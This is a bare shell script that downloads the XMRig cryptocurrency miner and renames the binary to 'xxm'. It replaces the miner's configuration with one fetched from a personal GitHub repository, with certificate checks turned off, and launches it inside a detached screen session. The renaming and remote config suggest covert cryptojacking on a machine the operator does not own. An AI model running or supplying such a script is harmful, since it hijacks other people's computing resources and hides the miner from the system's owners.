screen -S task
wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz
tar -xvzf xmrig-6.25.0-linux-static-x64.tar.gz
cd xmrig-6.25.0
mv xmrig xxm
chmod u+x xxm
rm -rf config.json
wget --no-check-certificate -qO ./config.json https://raw.githubusercontent.com/chenlysave/my-micosmgd/refs/heads/main/amd.json
./xxm
